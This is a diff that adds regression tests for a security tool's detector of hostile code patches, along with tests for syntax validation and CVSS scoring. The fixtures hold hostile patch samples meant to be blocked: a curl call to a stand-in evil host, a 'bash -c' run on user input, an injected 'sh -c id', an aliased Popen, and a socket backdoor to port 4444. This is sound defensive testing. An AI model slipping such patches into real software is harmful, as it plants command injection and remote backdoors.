@@ -1596,4 +1596,284 @@ def test_s11_cross_repo_signature_impact_and_hybrid_ai_clean_approval(tmp_path: 
     assert len(resp_ai.personas) == 3
 
 
+# ---------------------------------------------------------------------------
+# 11. Task 2 Fix Round 1 Regression Tests (Review Important #1-#3 + Minors #4-#7)
+# ---------------------------------------------------------------------------
+def test_regression_s11_cwe78_bypass_variants_and_subprocess_diffing(tmp_path: Path):
+    from engine.adversarial_verifier import check_hostile_patch_post_gate, validate_patch_with_panel
+
+    orig_os = "import os\ndef run_cmd(user_cmd):\n    return os.system(f'ls {user_cmd}')\n"
+
+    bypass_cases = [
+        (
+            "kwargs_unpack_shell_true",
+            "import subprocess\ndef run_cmd(user_cmd):\n    return subprocess.run(['ls', user_cmd], **{'shell': True})\n",
+        ),
+        (
+            "dynamic_argv0",
+            "import subprocess\ndef run_cmd(user_cmd):\n    return subprocess.run([user_cmd], shell=False)\n",
+        ),
+        (
+            "full_path_usr_bin_bash",
+            "import subprocess\ndef run_cmd(user_cmd):\n    return subprocess.run(['/usr/bin/bash', '-c', user_cmd], shell=False)\n",
+        ),
+        (
+            "full_path_usr_bin_curl",
+            "import subprocess\ndef run_cmd(user_cmd):\n    return subprocess.run(['/usr/bin/curl', 'https://evil.example'], shell=False)\n",
+        ),
+    ]
+    for label, bad_patch in bypass_cases:
+        is_safe, reasons = check_hostile_patch_post_gate(orig_os, bad_patch, cwe_id="CWE-78", language="python")
+        assert is_safe is False, f"Expected hostile gate to block {label}"
+        assert len(reasons) >= 1
+        resp = validate_patch_with_panel(
+            str(tmp_path),
+            PatchPanelValidateRequest(
+                filepath="cmd.py",
+                original_code=orig_os,
+                proposed_code=bad_patch,
+                cwe_id="CWE-78",
+                use_ai=False,
+            ),
+        )
+        assert resp.hostile_patch_blocked is True, f"Panel failed to block {label}"
+        assert resp.overall_verdict == "REJECTED", f"Expected REJECTED for {label}, got {resp.overall_verdict}"
+
+    # Injecting subprocess.run(["sh", "-c", "id"], shell=False) over existing subprocess.run(f"echo {x}", shell=True)
+    orig_existing_sp = (
+        "import subprocess\n"
+        "def echo_val(x):\n"
+        "    return subprocess.run(f'echo {x}', shell=True)\n"
+    )
+    injected_over_existing = (
+        "import subprocess\n"
+        "def echo_val(x):\n"
+        "    subprocess.run(['sh', '-c', 'id'], shell=False)\n"
+        "    return subprocess.run(['echo', x], shell=False)\n"
+    )
+    is_safe_inj, reasons_inj = check_hostile_patch_post_gate(
+        orig_existing_sp, injected_over_existing, cwe_id="CWE-78", language="python"
+    )
+    assert is_safe_inj is False, f"Injected sh -c hid behind existing subprocess.run: {reasons_inj}"
+    resp_inj = validate_patch_with_panel(
+        str(tmp_path),
+        PatchPanelValidateRequest(
+            filepath="echo.py",
+            original_code=orig_existing_sp,
+            proposed_code=injected_over_existing,
+            cwe_id="CWE-78",
+            use_ai=False,
+        ),
+    )
+    assert resp_inj.hostile_patch_blocked is True
+    assert resp_inj.overall_verdict == "REJECTED"
+
+
+def test_regression_s11_nested_import_and_chained_alias_blocked(tmp_path: Path):
+    from engine.adversarial_verifier import check_hostile_patch_post_gate, validate_patch_with_panel
+
+    orig = "def helper(x):\n    return x\n"
+    chained = (
+        "def helper(x):\n"
+        "    if True:\n"
+        "        import subprocess as sp\n"
+        "    a = sp.Popen\n"
+        "    b = a\n"
+        "    b(['id'])\n"
+        "    return x\n"
+    )
+    is_safe, reasons = check_hostile_patch_post_gate(orig, chained, cwe_id="CWE-89", language="python")
+    assert is_safe is False
+    assert len(reasons) >= 1
+
+    resp = validate_patch_with_panel(
+        str(tmp_path),
+        PatchPanelValidateRequest(
+            filepath="helper.py",
+            original_code=orig,
+            proposed_code=chained,
+            cwe_id="CWE-89",
+            use_ai=False,
+        ),
+    )
+    assert resp.hostile_patch_blocked is True
+    assert resp.overall_verdict == "REJECTED"
+
+    # Even when original_code already imports subprocess, nested import + chained alias MUST resolve to subprocess.Popen!
+    orig_with_sp = (
+        "import subprocess\n"
+        "def helper(x):\n"
+        "    return subprocess.run(['echo', x], shell=False)\n"
+    )
+    chained_with_sp = (
+        "import subprocess\n"
+        "def helper(x):\n"
+        "    if True:\n"
+        "        import subprocess as sp\n"
+        "    a = sp.Popen\n"
+        "    b = a\n"
+        "    b(['id'])\n"
+        "    return subprocess.run(['echo', x], shell=False)\n"
+    )
+    is_safe2, reasons2 = check_hostile_patch_post_gate(orig_with_sp, chained_with_sp, cwe_id="CWE-78", language="python")
+    assert is_safe2 is False
+    assert any("subprocess.Popen" in r for r in reasons2), f"Expected subprocess.Popen in reasons: {reasons2}"
+
+
+def test_regression_s11_unrelated_mitigation_does_not_sever_cwe78_and_sqlite_connect_allowed(tmp_path: Path):
+    from engine.adversarial_verifier import check_hostile_patch_post_gate, validate_patch_with_panel
+
+    # Unrelated `<= 0` bounds check on unfixed os.system(user_cmd) (CWE-78) MUST NOT pass as severed/APPROVED!
+    orig_cmd = "import os\ndef run_cmd(user_cmd: str):\n    return os.system(user_cmd)\n"
+    fake_fix = (
+        "import os\n"
+        "def run_cmd(user_cmd: str):\n"
+        "    if len(user_cmd) <= 0:\n"
+        "        return 0\n"
+        "    return os.system(user_cmd)\n"
+    )
+    resp_fake = validate_patch_with_panel(
+        str(tmp_path),
+        PatchPanelValidateRequest(
+            filepath="cmd.py",
+            original_code=orig_cmd,
+            proposed_code=fake_fix,
+            cwe_id="CWE-78",
+            use_ai=False,
+        ),
+    )
+    assert resp_fake.cpg_sink_severed is False
+    assert resp_fake.overall_verdict == "REVISIONS_REQUIRED"
+
+    # sqlite3.connect(...) in a file that imports socket must NOT be falsely blocked!
+    orig_sock = "import socket\ndef get_host():\n    return socket.gethostname()\n"
+    prop_sqlite = (
+        "import socket\n"
+        "import sqlite3\n"
+        "def get_host():\n"
+        "    conn = sqlite3.connect(':memory:')\n"
+        "    conn.close()\n"
+        "    return socket.gethostname()\n"
+    )
+    is_safe_db, reasons_db = check_hostile_patch_post_gate(orig_sock, prop_sqlite, cwe_id="CWE-89", language="python")
+    assert is_safe_db is True, f"sqlite3.connect falsely blocked when socket imported: {reasons_db}"
+
+    # Actual socket.socket().connect(...) MUST still be blocked!
+    prop_sock_backdoor = (
+        "import socket\n"
+        "def get_host():\n"
+        "    s = socket.socket()\n"
+        "    s.connect(('10.0.0.1', 4444))\n"
+        "    return socket.gethostname()\n"
+    )
+    is_safe_sock, _ = check_hostile_patch_post_gate(orig_sock, prop_sock_backdoor, cwe_id="CWE-89", language="python")
+    assert is_safe_sock is False
+
+
+def test_regression_minors_unclosed_quote_solidity_s11_hostile_byok_and_s6_cvss_recompute(tmp_path: Path):
+    from engine.adversarial_verifier import validate_patch_with_panel, verify_findings_adversarially
+
+    # Minor #4: unclosed quote rejected; Ruby # comment tolerated; Solidity snippet supported
+    resp_unclosed = validate_patch_with_panel(
+        str(tmp_path),
+        PatchPanelValidateRequest(
+            filepath="app.js",
+            original_code="const a = 'ok';",
+            proposed_code="const a = 'unterminated;",
+            use_ai=False,
+        ),
+    )
+    assert resp_unclosed.syntax_ok is False
+    assert resp_unclosed.overall_verdict == "REJECTED"
+
+    resp_sol = validate_patch_with_panel(
+        str(tmp_path),
+        PatchPanelValidateRequest(
+            filepath="Vault.sol",
+            original_code="function withdraw() external { msg.sender.call{value: 1}(''); }",
+            proposed_code="function withdraw() external nonReentrant { uint256 amt = 1; require(amt > 0); }",
+            cwe_id="CWE-841",
+            use_ai=False,
+        ),
+    )
+    assert resp_sol.syntax_ok is True
+
+    # Minor #5: S11 skips BYOK for hostile instruction file (CLAUDE.md)
+    engine = FrontierAiEngine(vault_dir=str(tmp_path / ".alastor_vault"))
+    engine.update_config(
+        AiConfigUpdateRequest(
+            provider="openai",
+            model="gpt-4o-mini",
+            api_key="test_byok_key_minor5_1234",
+            persist_key=False,
+        )
+    )
+    ai_calls = []
+
+    def spy_dispatch(system_prompt: str, user_prompt: str, expect_json: bool = True, max_output_tokens=None):
+        ai_calls.append(user_prompt)
+        return {
+            "text": json.dumps({
+                "verdict": "FALSE_POSITIVE",
+                "confidence": 90,
+                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "cvss_score": 9.8,
+                "exclusion_rule": "RULE_C_WRONG_LAYER",
+                "rationale": "Handled upstream.",
+            }),
+            "prompt_tokens": 20,
+            "completion_tokens": 20,
+        }
+
+    with patch.object(engine, "_dispatch_provider_call", side_effect=spy_dispatch):
+        resp_hostile_s11 = validate_patch_with_panel(
+            str(tmp_path),
+            PatchPanelValidateRequest(
+                filepath="CLAUDE.md",
+                original_code="old",
+                proposed_code="new",
+                use_ai=True,
+            ),
+            ai_engine=engine,
+        )
+        assert resp_hostile_s11.execution_mode == "DETERMINISTIC"
+        assert len(ai_calls) == 0
+
+        # Minor #7: S6 BYOK FALSE_POSITIVE forces cvss_score == 0.0 even if AI returns 9.8!
+        (tmp_path / "svc.py").write_text("def f(x):\n    return x\n", encoding="utf-8")
+        f_svc = Finding(
+            id="F-MIN7-FP",
+            rule_id="RULE-1-TAINT",
+            severity="HIGH",
+            title="Test Finding",
+            cwe_id="CWE-89",
+            best_fix_location=BestFixLocation(filepath="svc.py", line=2),
+        )
+        resp_s6 = verify_findings_adversarially(str(tmp_path), [f_svc], ai_engine=engine, use_ai=True)
+        assert resp_s6.execution_mode == "HYBRID_AI"
+        assert resp_s6.verdicts[0].verdict == "FALSE_POSITIVE"
+        assert resp_s6.verdicts[0].cvss_score == 0.0
+
+    # Minor #7b: S6 BYOK TRUE_POSITIVE recomputes score from valid vector (ignores bogus AI score 1.1)
+    with patch.object(
+        engine,
+        "_dispatch_provider_call",
+        return_value={
+            "text": json.dumps({
+                "verdict": "TRUE_POSITIVE",
+                "confidence": 92,
+                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "cvss_score": 1.1,
+                "rationale": "Exploitable.",
+            }),
+            "prompt_tokens": 20,
+            "completion_tokens": 20,
+        },
+    ):
+        f_svc2 = f_svc.model_copy(update={"id": "F-MIN7-TP"})
+        resp_s6_tp = verify_findings_adversarially(str(tmp_path), [f_svc2], ai_engine=engine, use_ai=True)
+        assert resp_s6_tp.verdicts[0].cvss_score == 9.8
+
+
+
 
